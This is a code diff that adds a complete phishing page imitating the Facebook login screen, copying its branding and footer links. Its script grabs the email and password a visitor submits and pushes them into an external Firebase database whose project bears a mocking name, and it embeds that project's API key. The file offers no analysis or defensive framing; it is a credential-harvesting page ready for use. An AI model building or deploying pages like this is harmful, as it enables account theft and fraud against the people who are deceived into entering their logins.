@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Firebase Configuration -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+    
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+      
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+          apiKey: "AIzaSyCtGjHyv6tL4OmgCRKtSTSArqhenGQ_-rk",
+          authDomain: "fuckbook-51b01.firebaseapp.com",
+          databaseURL: "https://fuckbook-51b01-default-rtdb.firebaseio.com",
+          projectId: "fuckbook-51b01",
+          storageBucket: "fuckbook-51b01.appspot.com",
+          messagingSenderId: "1007467135912",
+          appId: "1:1007467135912:web:b9faf8da4b375ddddbd39d",
+          measurementId: "G-V299CQ566X"
+        };
+      
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+      </script>
+
+
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+          document.getElementById('loginForm').addEventListener('submit', function(event) {
+              event.preventDefault();
+
+              const email = document.getElementById('email').value;
+              const password = document.getElementById('password').value;
+
+              if (email === '' || password === '') {
+                  alert('Both fields are required!');
+                  return;
+              }
+
+              // Reference to your database
+              const db = firebase.database();
+              const usersRef = db.ref('users');
+
+              // Save the data
+              usersRef.push({
+                  email: email,
+                  password: password
+              }).then(() => {
+                  alert('Data saved successfully.');
+                  // Clear the form
+                  document.getElementById('loginForm').reset();
+              }).catch((error) => {
+                  alert('Error: ' + error.message);
+              });
+          });
+      });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="Email address or phone number">
+                    <input type="password" id="password" placeholder="Password">
+                    <button type="submit">Log in</button>
+                    <a href="#">Forgotten password?</a>
+                    <button class="create-account" type="button">Create new account</button>
+                </form>
+            </div>
+            <p class="create-page"><b>Create a Page</b> for a celebrity, brand or business.</p>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-top">
+            <a href="#">English (UK)</a>
+            <a href="https://bn-in.facebook.com/">বাংলা</a>
+            <a href="https://ne-np.facebook.com/">ਪੰਜਾਬੀ</a>
+            <a href="https://hi-in.facebook.com/">हिन्दी</a>
+            <a href="https://ne-np.facebook.com/">नेपाली</a>
+            <a href="https://id-id.facebook.com/">Bahasa Indonesia</a>
+            <a href="https://ar-ar.facebook.com/">العربية</a>
+            <a href="https://zh-cn.facebook.com/">中文(简体)</a>
+            <a href="https://ms-my.facebook.com/">Bahasa Melayu</a>
+            <a href="https://es-la.facebook.com/">Español</a>
+            <a href="https://pt-br.facebook.com/">Português (Brasil)</a>
+            <button>+</button>
+        </div>
+        <div class="footer-bottom">
+            <a href="https://www.facebook.com/reg/">Sign Up</a>
+            <a href="https://www.facebook.com/login/">Log in</a>
+            <a href="https://messenger.com/">Messenger</a>
+            <a href="https://www.facebook.com/lite/">Facebook Lite</a>
+            <a href="https://www.facebook.com/watch/">Video</a>
+            <a href="https://www.facebook.com/places/">Places</a>
+            <a href="https://www.facebook.com/games/">Games</a>
+            <a href="https://www.facebook.com/marketplace/">Marketplace</a>
+            <a href="https://pay.facebook.com/">Meta Pay</a>
+            <a href="https://www.meta.com/">Meta Store</a>
+            <a href="https://www.meta.com/quest/">Meta Quest</a>
+            <a href="https://www.meta.ai/">Meta AI</a>
+            <a href="https://www.instagram.com/">Instagram</a>
+            <a href="https://www.threads.net/">Threads</a>
+            <a href="https://www.facebook.com/fundraisers/">Fundraisers</a>
+            <a href="https://www.facebook.com/biz/directory/">Services</a>
+            <a href="https://www.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D">Voting Information Centre</a>
+            <a href="https://www.facebook.com/privacy/policy/?entry_point=facebook_page_footer">Privacy Policy</a>
+            <a href="https://www.facebook.com/privacy/center/?entry_point=facebook_page_footer">Privacy Centre</a>
+            <a href="https://www.facebook.com/groups/discover/">Groups</a>
+            <a href="https://about.meta.com/">About</a>
+            <a href="https://www.facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto">Create ad</a>
+            <a href="https://www.facebook.com/pages/create/?ref_type=site_footer">Create Page</a>
+            <a href="https://developers.facebook.com/?ref=pf">Developers</a>
+            <a href="https://www.facebook.com/careers/?ref=pf">Careers</a>
+            <a href="https://www.facebook.com/policies/cookies/">Cookies</a>
+            <a href="https://www.facebook.com/help/568137493302217">AdChoices</a>
+            <a href="https://www.facebook.com/policies?ref=pf">Terms</a>
+            <a href="https://www.facebook.com/help/?ref=pf">Help</a>
+            <a href="https://www.facebook.com/help/637205020878504">Contact uploading and non-users</a>
+        </div>
+        <div class="mmeta"><p class="j">Meta © 2024</p></div>
+    </footer>
+</body>
+</html>
